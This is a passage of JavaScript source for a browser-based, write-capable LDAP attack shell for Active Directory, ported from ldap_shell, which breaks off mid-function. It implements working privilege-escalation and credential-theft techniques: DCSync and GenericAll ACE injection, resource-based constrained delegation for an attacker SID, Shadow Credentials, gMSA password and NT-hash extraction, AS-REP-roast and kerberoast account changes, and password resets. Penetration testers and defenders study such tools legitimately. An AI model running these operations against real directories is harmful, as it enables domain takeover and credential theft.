// An interactive, write-capable LDAP shell for Active Directory — a browser
// port of the command set from PShlyundin/ldap_shell. Runs over the shared LDAP
// client (NTLM / Kerberos / simple auth, optional LDAPS + channel binding) and
// adds the AD operations: enumerate, create/delete objects, group membership,
// password reset, UAC flags (disable / AS-REP-roast), SPN (kerberoast),
// resource-based constrained delegation, DACL editing, Shadow Credentials,
// gMSA password reading, and more.

import { SCOPE, filter as F } from './ldap/client.js';
import { tlv, octetString, integer as berInt, boolean as berBool, sequence as berSeq, concat as berConcat } from './ldap/ber.js';
import { bytesToSid, bytesToGuid } from './security/sid.js';

const dec = new TextDecoder();
const hex = (buf) => [...buf].map((b) => b.toString(16).padStart(2, '0')).join('');

// userAccountControl bits we toggle.
const UAC = { ACCOUNTDISABLE: 0x0002, NORMAL_ACCOUNT: 0x0200, WORKSTATION_TRUST: 0x1000, DONT_REQ_PREAUTH: 0x400000 };

const ACE_TYPES = { 0: 'ALLOW', 1: 'DENY', 5: 'ALLOW_OBJ', 6: 'DENY_OBJ' };
const KNOWN_GUIDS = {
  '00299570-246d-11d0-a768-00aa006e0529': 'User-Force-Change-Password',
  '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2': 'DS-Replication-Get-Changes',
  '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2': 'DS-Replication-Get-Changes-All',
  '1131f6ac-9c07-11d1-f79f-00c04fc2dcd2': 'DS-Repl-Get-Changes-In-Filtered-Set',
  'bf9679c0-0de6-11d0-a285-00aa003049e2': 'Member',
  '5b47d60f-6090-40b2-9f37-2a4de88f3063': 'ms-DS-Key-Credential-Link',
  '00000000-0000-0000-0000-000000000000': '(all)',
};

const ACE_RIGHTS = {
  genericall: { mask: 0x000F01FF, type: 0x00 },
  writedacl: { mask: 0x00040000, type: 0x00 },
  writeowner: { mask: 0x00080000, type: 0x00 },
  writeprop: { mask: 0x00000020, type: 0x00 },
  dcsync: [
    { mask: 0x00000100, type: 0x05, objectType: '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' },
    { mask: 0x00000100, type: 0x05, objectType: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' },
  ],
  resetpassword: { mask: 0x00000100, type: 0x05, objectType: '00299570-246d-11d0-a768-00aa006e0529' },
};

// unicodePwd wire format: UTF-16LE of the password wrapped in double quotes.
function unicodePwd(pw) {
  const s = `"${pw}"`;
  const out = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); out[i * 2] = c & 0xff; out[i * 2 + 1] = (c >> 8) & 0xff; }
  return out;
}

// Self-relative SECURITY_DESCRIPTOR for msDS-AllowedToActOnBehalfOfOtherIdentity:
// owner BUILTIN\Administrators, DACL = one ACCESS_ALLOWED ACE (full control) for
// the attacker SID. (RBCD.)
function buildRbcdSd(attackerSid) {
  const owner = Uint8Array.of(0x01, 0x02, 0, 0, 0, 0, 0, 5, 0x20, 0, 0, 0, 0x24, 0x02, 0, 0); // S-1-5-32-544
  const ace = new Uint8Array(8 + attackerSid.length);
  const adv = new DataView(ace.buffer);
  ace[0] = 0x00; ace[1] = 0x00; adv.setUint16(2, ace.length, true); adv.setUint32(4, 0x000f01ff, true);
  ace.set(attackerSid, 8);
  const acl = new Uint8Array(8 + ace.length);
  const acv = new DataView(acl.buffer);
  acl[0] = 0x02; acv.setUint16(2, acl.length, true); acv.setUint16(4, 1, true);
  acl.set(ace, 8);
  const HDR = 20, offOwner = HDR + acl.length;
  const sd = new Uint8Array(offOwner + owner.length);
  const dv = new DataView(sd.buffer);
  sd[0] = 0x01; dv.setUint16(2, 0x8004, true);
  dv.setUint32(4, offOwner, true); dv.setUint32(16, HDR, true);
  sd.set(acl, HDR); sd.set(owner, offOwner);
  return sd;
}

// ---- Security descriptor parsing / building ----

function u16le(buf, off) { return buf[off] | (buf[off + 1] << 8); }
function u32le(buf, off) { return (buf[off] | (buf[off + 1] << 8) | (buf[off + 2] << 16) | (buf[off + 3] << 24)) >>> 0; }

function parseSD(buf) {
  if (!buf || buf.length < 20) return null;
  const control = u16le(buf, 2);
  const offOwner = u32le(buf, 4);
  const offGroup = u32le(buf, 8);
  const offDacl = u32le(buf, 16);
  const owner = offOwner ? bytesToSid(buf.subarray(offOwner)) : null;
  const group = offGroup ? bytesToSid(buf.subarray(offGroup)) : null;
  const aces = [];
  if (offDacl && (control & 0x0004)) {
    const aceCount = u16le(buf, offDacl + 4);
    let pos = offDacl + 8;
    for (let i = 0; i < aceCount && pos + 4 <= buf.length; i++) {
      const type = buf[pos];
      const aceFlags = buf[pos + 1];
      const aceSize = u16le(buf, pos + 2);
      if (aceSize < 4 || pos + aceSize > buf.length) break;
      const mask = u32le(buf, pos + 4);
      let sid, objectType = null, inheritedType = null;
      if (type === 0x05 || type === 0x06) {
        const objFlags = u32le(buf, pos + 8);
        let soff = pos + 12;
        if (objFlags & 1) { objectType = bytesToGuid(buf.subarray(soff, soff + 16)); soff += 16; }
        if (objFlags & 2) { inheritedType = bytesToGuid(buf.subarray(soff, soff + 16)); soff += 16; }
        sid = bytesToSid(buf.subarray(soff, pos + aceSize));
      } else {
        sid = bytesToSid(buf.subarray(pos + 8, pos + aceSize));
      }
      aces.push({ type, aceFlags, mask, sid, objectType, inheritedType });
      pos += aceSize;
    }
  }
  return { owner, group, aces };
}

function formatMask(mask) {
  if ((mask & 0x000F01FF) === 0x000F01FF) return 'GenericAll';
  const f = [];
  if (mask & 0x00000001) f.push('CreateChild');
  if (mask & 0x00000002) f.push('DeleteChild');
  if (mask & 0x00000004) f.push('ListContents');
  if (mask & 0x00000008) f.push('Self');
  if (mask & 0x00000010) f.push('ReadProp');
  if (mask & 0x00000020) f.push('WriteProp');
  if (mask & 0x00000040) f.push('DeleteTree');
  if (mask & 0x00000080) f.push('ListObject');
  if (mask & 0x00000100) f.push('ExtendedRight');
  if (mask & 0x00010000) f.push('Delete');
  if (mask & 0x00020000) f.push('ReadControl');
  if (mask & 0x00040000) f.push('WriteDacl');
  if (mask & 0x00080000) f.push('WriteOwner');
  return f.length ? f.join('|') : `0x${mask.toString(16).padStart(8, '0')}`;
}

function guidToBytes(guid) {
  const h = (s) => parseInt(s, 16);
  const p = guid.split('-');
  const buf = new Uint8Array(16);
  for (let i = 0; i < 4; i++) buf[i] = h(p[0].slice((3 - i) * 2, (3 - i) * 2 + 2));
  for (let i = 0; i < 2; i++) buf[4 + i] = h(p[1].slice((1 - i) * 2, (1 - i) * 2 + 2));
  for (let i = 0; i < 2; i++) buf[6 + i] = h(p[2].slice((1 - i) * 2, (1 - i) * 2 + 2));
  for (let i = 0; i < 2; i++) buf[8 + i] = h(p[3].slice(i * 2, i * 2 + 2));
  for (let i = 0; i < 6; i++) buf[10 + i] = h(p[4].slice(i * 2, i * 2 + 2));
  return buf;
}

function buildAce(type, flags, mask, sidBytes, objTypeGuid = null) {
  const maskBuf = Uint8Array.of(mask & 0xff, (mask >> 8) & 0xff, (mask >> 16) & 0xff, (mask >> 24) & 0xff);
  let body;
  if (type === 0x05 || type === 0x06) {
    const objFlags = objTypeGuid ? 1 : 0;
    const parts = [maskBuf, Uint8Array.of(objFlags, 0, 0, 0)];
    if (objTypeGuid) parts.push(typeof objTypeGuid === 'string' ? guidToBytes(objTypeGuid) : objTypeGuid);
    parts.push(sidBytes);
    body = berConcat(parts);
  } else {
    body = berConcat([maskBuf, sidBytes]);
  }
  const aceSize = 4 + body.length;
  return berConcat([Uint8Array.of(type, flags, aceSize & 0xff, (aceSize >> 8) & 0xff), body]);
}

function rebuildSdWithAces(origSd, newAces) {
  const control = u16le(origSd, 2);
  const offDacl = u32le(origSd, 16);
  let existingBody = new Uint8Array(0), existingCount = 0, existingRev = 0x02;
  if (offDacl && (control & 0x0004)) {
    existingRev = origSd[offDacl];
    const aclSize = u16le(origSd, offDacl + 2);
    existingCount = u16le(origSd, offDacl + 4);
    existingBody = origSd.subarray(offDacl + 8, offDacl + aclSize);
  }
  const allBodies = berConcat([existingBody, ...newAces]);
  const rev = (existingRev === 4 || newAces.some((a) => a[0] === 0x05 || a[0] === 0x06)) ? 4 : 2;
  const aceCount = existingCount + newAces.length;
  const aclSize = 8 + allBodies.length;
  const acl = new Uint8Array(aclSize);
  acl[0] = rev;
  acl[2] = aclSize & 0xff; acl[3] = (aclSize >> 8) & 0xff;
  acl[4] = aceCount & 0xff; acl[5] = (aceCount >> 8) & 0xff;
  acl.set(allBodies, 8);
  const HDR = 20;
  const sd = new Uint8Array(HDR + acl.length);
  sd[0] = 0x01; sd[2] = 0x04; sd[3] = 0x80;
  sd[16] = HDR & 0xff; sd[17] = (HDR >> 8) & 0xff;
  sd.set(acl, HDR);
  return sd;
}

function buildSdFlagsControl(flags) {
  return tlv(0xa0, berSeq(octetString('1.2.840.113556.1.4.801'), berBool(true), octetString(berInt(flags))));
}

// ---- MD4 hash (for gMSA NT hash computation) ----

function md4(msg) {
  const rotl = (v, n) => ((v << n) | (v >>> (32 - n))) >>> 0;
  const fn = [(x, y, z) => (x & y) | (~x & z), (x, y, z) => (x & y) | (x & z) | (y & z), (x, y, z) => x ^ y ^ z];
  const len = msg.length;
  let padLen = len + 1;
  while (padLen % 64 !== 56) padLen++;
  const buf = new Uint8Array(padLen + 8);
  buf.set(msg); buf[len] = 0x80;
  const bits = len * 8;
  buf[padLen] = bits & 0xff; buf[padLen + 1] = (bits >> 8) & 0xff;
  buf[padLen + 2] = (bits >> 16) & 0xff; buf[padLen + 3] = (bits >> 24) & 0xff;
  let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  const rd = (off) => buf[off] | (buf[off + 1] << 8) | (buf[off + 2] << 16) | ((buf[off + 3] << 24) >>> 0);
  const R2 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15];
  const R3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15];
  for (let off = 0; off < buf.length; off += 64) {
    const X = []; for (let j = 0; j < 16; j++) X[j] = rd(off + j * 4);
    let a = a0, b = b0, c = c0, d = d0;
    for (let i = 0; i < 4; i++) {
      a = rotl((a + fn[0](b, c, d) + X[i * 4]) >>> 0, 3);
      d = rotl((d + fn[0](a, b, c) + X[i * 4 + 1]) >>> 0, 7);
      c = rotl((c + fn[0](d, a, b) + X[i * 4 + 2]) >>> 0, 11);
      b = rotl((b + fn[0](c, d, a) + X[i * 4 + 3]) >>> 0, 19);
    }
    for (let i = 0; i < 4; i++) {
      a = rotl((a + fn[1](b, c, d) + X[R2[i * 4]] + 0x5A827999) >>> 0, 3);
      d = rotl((d + fn[1](a, b, c) + X[R2[i * 4 + 1]] + 0x5A827999) >>> 0, 5);
      c = rotl((c + fn[1](d, a, b) + X[R2[i * 4 + 2]] + 0x5A827999) >>> 0, 9);
      b = rotl((b + fn[1](c, d, a) + X[R2[i * 4 + 3]] + 0x5A827999) >>> 0, 13);
    }
    for (let i = 0; i < 4; i++) {
      a = rotl((a + fn[2](b, c, d) + X[R3[i * 4]] + 0x6ED9EBA1) >>> 0, 3);
      d = rotl((d + fn[2](a, b, c) + X[R3[i * 4 + 1]] + 0x6ED9EBA1) >>> 0, 9);
      c = rotl((c + fn[2](d, a, b) + X[R3[i * 4 + 2]] + 0x6ED9EBA1) >>> 0, 11);
      b = rotl((b + fn[2](c, d, a) + X[R3[i * 4 + 3]] + 0x6ED9EBA1) >>> 0, 15);
    }
    a0 = (a0 + a) >>> 0; b0 = (b0 + b) >>> 0; c0 = (c0 + c) >>> 0; d0 = (d0 + d) >>> 0;
  }
  const out = new Uint8Array(16);
  [a0, b0, c0, d0].forEach((v, i) => {
    out[i * 4] = v & 0xff; out[i * 4 + 1] = (v >> 8) & 0xff;
    out[i * 4 + 2] = (v >> 16) & 0xff; out[i * 4 + 3] = (v >> 24) & 0xff;
  });
  return out;
}

// ---- Shadow Credentials helpers ----

function extractRsaComponents(spki) {
  const walk = (buf, pos) => {
    let i = pos + 1, len = buf[i++];
    if (len & 0x80) { const n = len & 0x7f; len = 0; for (let k = 0; k < n; k++) len = len * 256 + buf[i++]; }
    return { start: i, end: i + len };
  };
  const outer = walk(spki, 0);
  const algId = walk(spki, outer.start);
  const bitStr = walk(spki, algId.end);
  const rsaSeq = walk(spki, bitStr.start + 1);
  const modTlv = walk(spki, rsaSeq.start);
  let ms = modTlv.start, ml = modTlv.end - modTlv.start;
  if (spki[ms] === 0) { ms++; ml--; }
  const expTlv = walk(spki, modTlv.end);
  return { modulus: spki.slice(ms, ms + ml), exponent: spki.slice(expTlv.start, expTlv.end) };
}

function buildBcryptRsaBlob(mod, exp) {
  const hdr = new Uint8Array(24);
  const dv = new DataView(hdr.buffer);
  dv.setUint32(0, 0x31415352, true); dv.setUint32(4, mod.length * 8, true);
  dv.setUint32(8, exp.length, true); dv.setUint32(12, mod.length, true);
  return berConcat([hdr, exp, mod]);
}

function buildKeyCredStruct(keyId, keyMaterial, deviceId) {
  const now = BigInt(Date.now()) * 10000n + 116444736000000000n;
  const tb = new Uint8Array(8);
  const tdv = new DataView(tb.buffer);
  tdv.setUint32(0, Number(now & 0xFFFFFFFFn), true);
  tdv.setUint32(4, Number((now >> 32n) & 0xFFFFFFFFn), true);
  const entries = [
    { id: 3, v: keyId }, { id: 1, v: Uint8Array.of(1) }, { id: 2, v: Uint8Array.of(0) },
    { id: 4, v: keyMaterial }, { id: 5, v: deviceId }, { id: 8, v: tb },
  ];
  let total = 4;
  for (const e of entries) total += 6 + e.v.length;
  const buf = new Uint8Array(total);
  const dv = new DataView(buf.buffer);
  dv.setUint32(0, 0x200, true);
  let pos = 4;
  for (const e of entries) {
    dv.setUint16(pos, e.id, true); pos += 2;
    dv.setUint32(pos, e.v.length, true); pos += 4;
    buf.set(e.v, pos); pos += e.v.length;
  }
  return buf;
}

// Minimal RFC 4515 filter string -> BER, for the `search` command.
// Supports =, >=, <=, *, substring, extensible match (attr:rule:=value).
function parseFilter(str) {
  const enc = new TextEncoder();
  let i = 0;
  const eat = (c) => { if (str[i] !== c) throw new Error(`bad filter at ${i}`); i++; };
  function parse() {
    eat('(');
    let node; const c = str[i];
    if (c === '&') { i++; node = F.and(...list()); }
    else if (c === '|') { i++; node = F.or(...list()); }
    else if (c === '!') { i++; node = tlv(0xa2, parse()); }
    else node = item();
    eat(')'); return node;
  }
  function list() { const s = []; while (str[i] === '(') s.push(parse()); return s; }
  function item() {
    let a = ''; while (i < str.length && !'=><)'.includes(str[i])) a += str[i++];
    if (str[i] === '>') { i++; eat('='); let v = ''; while (i < str.length && str[i] !== ')') v += str[i++]; return F.ge(a, v); }
    if (str[i] === '<') { i++; eat('='); let v = ''; while (i < str.length && str[i] !== ')') v += str[i++]; return F.le(a, v); }
    eat('='); let v = ''; while (i < str.length && str[i] !== ')') v += str[i++];
    if (a.endsWith(':')) {
      a = a.slice(0, -1);
      const parts = a.split(':');
      const attr = parts[0] || null;
      const rule = parts.slice(1).filter((p) => p !== 'dn').join(':') || null;
      const hasDn = parts.includes('dn');
      return F.extensible(attr, v, rule, hasDn);
    }
    if (v === '*') return F.present(a);
    if (v.includes('*')) {
      const parts = v.split('*'); const ch = [];
      if (parts[0]) ch.push(tlv(0x80, enc.encode(parts[0])));
      for (let k = 1; k < parts.length - 1; k++) if (parts[k]) ch.push(tlv(0x81, enc.encode(parts[k])));
      if (parts[parts.length - 1]) ch.push(tlv(0x82, enc.encode(parts[parts.length - 1])));
      return tlv(0xa4, berConcat([octetString(a), tlv(0x30, berConcat(ch))]));
    }
    return F.equal(a, v);
  }
  return parse();
}

// Split a command line into tokens, honouring "double" and 'single' quotes.
function tokenize(line) {
  return (line.match(/"[^"]*"|'[^']*'|\S+/g) || []).map((t) => t.replace(/^["']|["']$/g, ''));
}

// Exposed for unit tests.
export const _internals = { unicodePwd, buildRbcdSd, parseFilter, parseSD, md4, guidToBytes, buildAce };

export class LdapShell {
  constructor(client, { baseDN, domain, tls = false, log = () => {} }) {
    this.client = client;
    this.baseDN = baseDN;
    this.domain = domain;
    this.tls = tls;
    this._log = log;
  }

  // ---- attribute helpers ----
  _key(e, name) { return Object.keys(e.attributes).find((k) => k.toLowerCase() === name.toLowerCase()); }
  _attr(e, name) { const k = this._key(e, name); return k ? dec.decode(e.attributes[k][0]) : null; }
  _attrRaw(e, name) { const k = this._key(e, name); return k ? e.attributes[k][0] : null; }
  _attrAll(e, name) { const k = this._key(e, name); return k ? e.attributes[k].map((v) => dec.decode(v)) : []; }

  // Resolve a DN or sAMAccountName to a single entry with the requested attrs.
  async _resolve(name, attrs = ['distinguishedName']) {
    const isDn = /^(CN|OU|DC)=/i.test(name);
    const opts = isDn
      ? { baseDN: name, scope: SCOPE.BASE, filter: F.present('objectClass'), attributes: attrs }
      : { baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: F.or(F.equal('sAMAccountName', name), F.equal('sAMAccountName', `${name}$`)), attributes: attrs };
    let found = null;
    for await (const e of this.client.search(opts)) { if (!found) found = e; }
    return found;
  }

  // Command names (for Tab completion / help).
  get commands() { return Object.keys(this._cmds).concat('exit'); }

  // ---- command dispatch ----
  async run(line) {
    const t = tokenize(line);
    if (!t.length) return '';
    const cmd = t[0].toLowerCase();
    const fn = this._cmds[cmd];
    if (!fn) return `Unknown command: ${cmd}. Type "help".`;
    return fn.call(this, t.slice(1));
  }

  get _cmds() {
    return {
      help: () => this.help(),
      whoami: () => this.client.whoami().then((s) => `[+] ${s}`),
      search: (a) => this.search(a[0], a[1]),
      dump: (a) => this.search(a[0] || '(objectClass=*)', a[1] || 'distinguishedName,objectClass,sAMAccountName'),
      get_object: (a) => this.getObject(a[0]),
      get_sid: (a) => this.getSid(a[0]),
      get_user_groups: (a) => this.getUserGroups(a.filter((x) => x !== '-r')[0], a.includes('-r')),
      get_group_members: (a) => this.getGroupMembers(a[0]),
      add_user: (a) => this.addUser(a[0], a[1]),
      add_computer: (a) => this.addComputer(a[0], a[1]),
      del: (a) => this.del(a[0]),
      add_user_to_group: (a) => this.groupMember(a[0], a[1], 'add'),
      del_user_from_group: (a) => this.groupMember(a[0], a[1], 'delete'),
      change_password: (a) => this.changePassword(a[0], a[1]),
      enable_account: (a) => this.toggleUac(a[0], UAC.ACCOUNTDISABLE, false, 'ACCOUNTDISABLE'),
      disable_account: (a) => this.toggleUac(a[0], UAC.ACCOUNTDISABLE, true, 'ACCOUNTDISABLE'),
      set_dontreqpreauth: (a) => this.toggleUac(a[0], UAC.DONT_REQ_PREAUTH, a[1] !== 'false' && a[1] !== '-', 'DONT_REQ_PREAUTH'),
      set_spn: (a) => this.setSpn(a[0], a[1]),
      clear_spn: (a) => this.setSpn(a[0], a[1], true),
      set_rbcd: (a) => this.setRbcd(a[0], a[1]),
      clear_rbcd: (a) => this.clearRbcd(a[0]),
      get_laps: (a) => this.getLaps(a[0]),
      // -- enumeration --
      users: () => this.enumUsers(),
      computers: () => this.enumComputers(),
      groups: () => this.enumGroups(),
      dcs: () => this.enumDCs(),
      trusts: () => this.enumTrusts(),
      spns: () => this.enumSPNs(),
      asreproast: () => this.enumAsrepRoast(),
      delegations: () => this.enumDelegations(),
      passpol: () => this.enumPassPol(),
      // -- DACL --
      get_dacl: (a) => this.getDacl(a[0]),
      add_ace: (a) => this.addAce(a[0], a[1], a[2]),
      set_owner: (a) => this.setOwner(a[0], a[1]),
      // -- Shadow Credentials --
      shadow_cred: (a) => this.shadowCred(a[0], a[1]),
      // -- gMSA --
      get_gmsa: (a) => this.getGmsa(a[0]),
      // -- generic set --
      set: (a) => this.setAttr(a[0], a[1], a.slice(2).join(' ')),
    };
  }

  help() {
    return [
      'Commands:',
      '  whoami                                  show the bound identity (LDAP Who Am I)',
      '  search <filter> [attr,attr]             raw LDAP search (subtree from base DN)',
      '  dump [filter] [attrs]                   search shortcut',
      '  get_object <name|dn>                    show all attributes of one object',
      '  get_sid <name|dn>                       one-liner SID lookup (feed to `certipy req -sid …`)',
      '',
      '  --- Enumeration ---',
      '  users                                   list domain users',
      '  computers                               list domain computers',
      '  groups                                  list domain groups',
      '  dcs                                     list domain controllers',
      '  trusts                                  list domain trusts',
      '  spns                                    list kerberoastable users (users with SPNs)',
      '  asreproast                              list AS-REP roastable users (DONT_REQ_PREAUTH)',
      '  delegations                             list accounts with delegation configured',
      '  passpol                                 show domain password policy',
      '',
      '  --- Group membership ---',
      '  get_user_groups <user> [-r]             list a user\'s groups (-r = recursive via IN_CHAIN)',
      '  get_group_members <group>               list a group\'s members',
      '  add_user_to_group <member> <group>      add a member to a group',
      '  del_user_from_group <member> <group>    remove a member from a group',
      '',
      '  --- Object management ---',
      '  add_user <name> [password]              create a user (password needs LDAPS)',
      '  add_computer <name[$]> [password]       create a computer account',
      '  del <name|dn>                           delete an object',
      '  set <name> <attr> [value]               set/clear an attribute on an object',
      '',
      '  --- Account manipulation ---',
      '  change_password <target> <newpass>       reset a password (requires LDAPS)',
      '  enable_account / disable_account <name>  toggle the account-disabled flag',
      '  set_dontreqpreauth <name> [true|false]  toggle DONT_REQ_PREAUTH (AS-REP roast)',
      '  set_spn <name> <spn> / clear_spn        add/remove a servicePrincipalName',
      '  set_rbcd <target> <attacker>             resource-based constrained delegation',
      '  clear_rbcd <target>                      remove RBCD configuration',
      '  get_laps <computer>                      read LAPS password attributes',
      '',
      '  --- DACL operations ---',
      '  get_dacl <name|dn>                      display the DACL of an object',
      '  add_ace <target> <principal> <right>     add an ACE (genericall|writedacl|writeowner|',
      '                                           dcsync|writeprop|resetpassword|0xMASK)',
      '  set_owner <target> <new-owner>           change the owner of an object',
      '',
      '  --- Credential extraction ---',
      '  get_gmsa <account>                       read gMSA password and compute NT hash',
      '  shadow_cred <target> [list|add|remove]  Shadow Credentials (msDS-KeyCredentialLink)',
      '',
      '  help / exit',
    ].join('\n');
  }

  // Heuristic: treat a value as text if it has no NUL and few control bytes.
  // Avoids printing raw binary attributes as mojibake.
  _isTextBytes(buf) {
    if (!buf || !buf.length) return true;
    let ctrl = 0;
    const n = Math.min(buf.length, 128);
    for (let i = 0; i < n; i++) {
      const b = buf[i];
      if (b === 0) return false;
      if (b < 0x20 && b !== 0x09 && b !== 0x0a && b !== 0x0d) ctrl++;
    }
    return ctrl <= 1;
  }

  // AD stores several timestamps as Windows FILETIME (100-ns since 1601) in
  // LDAP as a decimal string. Only format when the attribute is one we know.
  _fmtFileTime(s) {
    const n = BigInt(s);
    if (n === 0n) return '(never)';
    if (n === 0x7FFFFFFFFFFFFFFFn) return '(never)';
    const ms = Number((n - 116444736000000000n) / 10000n);
    if (!Number.isFinite(ms) || ms < 0) return s;
    return `${new Date(ms).toISOString()} (${s})`;
  }

  _fmtGenTime(s) {
    // YYYYMMDDHHMMSS.0Z
    const m = /^(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/.exec(s);
    if (!m) return s;
    return `${m[1]}-${m[2]}-${m[3]}T${m[4]}:${m[5]}:${m[6]}Z`;
  }

  _fmtUac(s) {
    const uac = parseInt(s, 10) >>> 0;
    const bits = {
      0x0002: 'DISABLED', 0x0010: 'LOCKOUT', 0x0020: 'PASSWD_NOTREQD',
      0x0040: 'PASSWD_CANT_CHANGE', 0x0080: 'ENCRYPTED_TEXT_PWD_ALLOWED',
      0x0200: 'NORMAL_ACCOUNT', 0x0800: 'INTERDOMAIN_TRUST', 0x1000: 'WORKSTATION_TRUST',
      0x2000: 'SERVER_TRUST', 0x10000: 'DONT_EXPIRE_PASSWORD', 0x20000: 'MNS_LOGON',
      0x40000: 'SMARTCARD_REQUIRED', 0x80000: 'TRUSTED_FOR_DELEGATION',
      0x100000: 'NOT_DELEGATED', 0x200000: 'USE_DES_KEY_ONLY', 0x400000: 'DONT_REQ_PREAUTH',
      0x800000: 'PASSWORD_EXPIRED', 0x1000000: 'TRUSTED_TO_AUTH_FOR_DELEGATION',
    };
    const flags = Object.entries(bits).filter(([m]) => uac & Number(m)).map(([, n]) => n);
    return `0x${uac.toString(16)} (${flags.join('|') || '-'})`;
  }

  _formatValue(attr, v) {
    const lc = attr.toLowerCase();
    if (lc === 'objectsid' || lc === 'sidhistory' || lc === 'securityidentifier' || lc === 'ms-ds-creatorsid') return bytesToSid(v);
    if (lc === 'objectguid' || lc === 'schemaidguid' || lc === 'attributesecurityguid' || lc === 'ms-ds-consistencyguid') {
      if (v.length === 16) return bytesToGuid(v);
    }
    if (lc === 'ntsecuritydescriptor') {
      const p = parseSD(v);
      return p ? `SD owner=${p.owner} group=${p.group} aces=${p.aces.length} [use get_dacl for detail]` : `<binary ${v.length}B>`;
    }
    if (lc === 'msds-keycredentiallink') {
      // DN-Binary syntax: "B:<hexlen>:<hex>:<dn>"
      const s = dec.decode(v);
      const m = /^B:(\d+):([0-9A-Fa-f]+):(.+)$/.exec(s);
      if (m) return `<key-credential ${Number(m[1]) / 2}B blob> tied to ${m[3]}`;
      return `<key-credential ${v.length}B>`;
    }
    if (lc === 'logonhours' && v.length === 21) {
      const hrs = [];
      for (let d = 0; d < 7; d++) {
        let byteHours = 0;
        for (let b = 0; b < 24; b++) {
          const bit = d * 24 + b;
          if (v[bit >> 3] & (1 << (bit & 7))) byteHours++;
        }
        hrs.push(byteHours);
      }
      return `${hrs.reduce((a, b) => a + b, 0)}h/week (per day: ${hrs.join(',')})`;
    }
    if (lc === 'usercertificate' || lc === 'usersmimecertificate' || lc === 'cacertificate') {
      return `<X.509 cert, ${v.length}B, sha1=${hex(v.subarray(0, 8))}…>`;
    }
    if (lc === 'jpegphoto' || lc === 'thumbnailphoto') return `<image, ${v.length}B>`;
    if (lc === 'msds-generationid' || lc === 'dsasignature' || lc === 'msds-supportedencryptiontypes'
        || lc === 'replpropertymetadata' || lc === 'repluptodatevector' || lc === 'auditingpolicy'
        || lc === 'userparameters' || lc === 'msds-managedpassword' || lc === 'msds-managedpasswordid'
        || lc === 'msds-managedpasswordprevious') {
      return `<binary ${v.length}B: ${hex(v.subarray(0, Math.min(v.length, 24)))}${v.length > 24 ? '…' : ''}>`;
    }
    // Decode as UTF-8 if it looks textual; else hex-dump.
    if (this._isTextBytes(v)) {
      const s = dec.decode(v);
      if (lc === 'useraccountcontrol' && /^\d+$/.test(s)) return this._fmtUac(s);
      if ((lc === 'pwdlastset' || lc === 'lastlogon' || lc === 'lastlogontimestamp'
          || lc === 'accountexpires' || lc === 'badpasswordtime' || lc === 'lockouttime')
          && /^-?\d+$/.test(s)) return this._fmtFileTime(s);
      if ((lc === 'whencreated' || lc === 'whenchanged') && /^\d{14}/.test(s)) return this._fmtGenTime(s);
      return s;
    }
    return `<binary ${v.length}B: ${hex(v.subarray(0, Math.min(v.length, 32)))}${v.length > 32 ? '…' : ''}>`;
  }

  _format(e, attrs) {
    const lines = [e.dn];
    const names = attrs && attrs.length ? attrs : Object.keys(e.attributes).sort((a, b) => a.localeCompare(b));
    for (const a of names) {
      const k = this._key(e, a);
      if (!k) continue;
      const vals = e.attributes[k].map((v) => this._formatValue(k, v));
      lines.push(`    ${k}: ${vals.join(' | ')}`);
    }
    return lines.join('\n');
  }

  async search(filterStr, attrsStr) {
    const filt = filterStr ? parseFilter(filterStr) : F.present('objectClass');
    const attrs = attrsStr ? attrsStr.split(',') : [];
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: attrs })) {
      out.push(this._format(e, attrs));
      if (++n >= 200) { out.push('… (truncated at 200)'); break; }
    }
    return out.length ? `${out.join('\n\n')}\n\n[${n} object(s)]` : '(no results)';
  }

  async getObject(name) {
    const e = await this._resolve(name, []);
    if (!e) throw new Error(`object not found: ${name}`);
    return this._format(e, []);
  }

  // One-liner SID lookup for a user / group / computer, meant for
  // piping into `certipy req -sid …`. Accepts sAMAccountName, UPN, or DN.
  async getSid(name) {
    if (!name) throw new Error('usage: get_sid <sAMAccountName|DN>');
    const e = await this._resolve(name, ['objectSid', 'sAMAccountName']);
    if (!e) throw new Error(`object not found: ${name}`);
    const raw = this._attrRaw(e, 'objectSid');
    if (!raw) throw new Error(`${name}: no objectSid attribute (bind identity may lack rights)`);
    return `[+] ${dec.decode(this._attrRaw(e, 'sAMAccountName') || new Uint8Array())} — ${bytesToSid(raw)}`;
  }

  // ---- Group membership ----

  async getUserGroups(name, recursive = false) {
    if (!name) throw new Error('usage: get_user_groups <user> [-r]');
    if (recursive) {
      const e = await this._resolve(name, ['distinguishedName']);
      if (!e) throw new Error(`user not found: ${name}`);
      const groups = [];
      const filt = F.and(F.equal('objectClass', 'group'), F.extensible('member', e.dn, '1.2.840.113556.1.4.1941'));
      for await (const g of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: ['distinguishedName'] })) {
        groups.push(g.dn);
      }
      return groups.length ? `[+] ${name} recursive group memberships (${groups.length}):\n` + groups.map((g) => `    ${g}`).join('\n') : `[*] ${name} has no group memberships.`;
    }
    const e = await this._resolve(name, ['memberOf', 'primaryGroupID']);
    if (!e) throw new Error(`user not found: ${name}`);
    const groups = this._attrAll(e, 'memberOf');
    return groups.length ? `[+] ${name} is a member of:\n` + groups.map((g) => `    ${g}`).join('\n') : `[*] ${name} has no memberOf entries.`;
  }

  async getGroupMembers(name) {
    const e = await this._resolve(name, ['member']);
    if (!e) throw new Error(`group not found: ${name}`);
    const m = this._attrAll(e, 'member');
    return m.length ? `[+] ${name} members:\n` + m.map((x) => `    ${x}`).join('\n') : `[*] ${name} has no direct members.`;
  }

  // ---- Object management ----

  async addUser(name, password) {
    if (!name) throw new Error('usage: add_user <name> [password]');
    const dn = `CN=${name},CN=Users,${this.baseDN}`;
    const canPwd = password && this.tls;
    const attrs = {
